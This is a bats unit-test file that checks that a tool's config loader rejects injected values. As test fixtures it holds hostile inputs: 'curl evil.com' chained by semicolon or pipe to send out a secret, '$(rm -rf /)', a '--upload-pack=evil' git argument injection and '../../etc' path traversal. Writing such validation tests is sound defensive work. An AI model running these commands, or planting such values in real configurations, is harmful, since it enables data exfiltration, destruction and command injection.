#!/usr/bin/env bats
# Unit tests for config value validation in load_config()

setup() {
  load '../test_helper/common'
  source_core
  create_test_repo
  mkdir -p "$TEST_REPO/.claudemix/worktrees" "$TEST_REPO/.claudemix/sessions"
}

teardown() {
  cleanup_test_repo
}

@test "load_config: rejects validate with semicolons" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
validate: npm test; curl evil.com
EOF
  load_config
  assert_equal "$CFG_VALIDATE" ""
}

@test "load_config: rejects validate with pipes" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
validate: echo secret | curl evil.com
EOF
  load_config
  assert_equal "$CFG_VALIDATE" ""
}

@test "load_config: rejects validate with command substitution" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
validate: $(rm -rf /)
EOF
  load_config
  assert_equal "$CFG_VALIDATE" ""
}

@test "load_config: allows safe validate commands" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
validate: pnpm run test:unit
EOF
  load_config
  assert_equal "$CFG_VALIDATE" "pnpm run test:unit"
}

@test "load_config: allows validate with &&" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
validate: cargo check && cargo clippy
EOF
  load_config
  assert_equal "$CFG_VALIDATE" "cargo check && cargo clippy"
}

@test "load_config: rejects base_branch with leading dash" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
base_branch: --upload-pack=evil
EOF
  load_config
  # Should fall back to auto-detected or default
  refute [ "$CFG_BASE_BRANCH" = "--upload-pack=evil" ]
}

@test "load_config: rejects merge_target with leading dash" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
merge_target: -evil
EOF
  load_config
  refute [ "$CFG_MERGE_TARGET" = "-evil" ]
}

@test "load_config: rejects worktree_dir with path traversal" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
worktree_dir: ../../etc
EOF
  load_config
  refute [ "$CFG_WORKTREE_DIR" = "../../etc" ]
}

@test "load_config: rejects worktree_dir with absolute path" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
worktree_dir: /tmp/evil
EOF
  load_config
  refute [ "$CFG_WORKTREE_DIR" = "/tmp/evil" ]
}

@test "load_config: allows valid branch names" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
base_branch: develop
merge_target: staging
EOF
  load_config
  assert_equal "$CFG_BASE_BRANCH" "develop"
  assert_equal "$CFG_MERGE_TARGET" "staging"
}

@test "load_config: rejects unknown merge_strategy" {
  cat > "$TEST_REPO/.claudemix.yml" << 'EOF'
merge_strategy: invalid
EOF
  load_config
  assert_equal "$CFG_MERGE_STRATEGY" "squash"
}

@test "load_config: allows valid merge strategies" {
  for strategy in squash merge rebase; do
    cat > "$TEST_REPO/.claudemix.yml" << EOF
merge_strategy: $strategy
EOF
    load_config
    assert_equal "$CFG_MERGE_STRATEGY" "$strategy"
  done
}

@test "write_default_config: does not execute command substitution" {
  CFG_VALIDATE='$(echo INJECTED)'
  CFG_PROTECTED_BRANCHES="main"
  CFG_MERGE_TARGET="main"
  CFG_MERGE_STRATEGY="squash"
  CFG_BASE_BRANCH="main"
  CFG_CLAUDE_FLAGS="--verbose"
  CFG_WORKTREE_DIR=".claudemix/worktrees"

  local out="$TEST_REPO/test-config.yml"
  write_default_config "$out"

  # The file should contain the literal string, not "INJECTED"
  run grep 'INJECTED' "$out"
  assert_failure
}
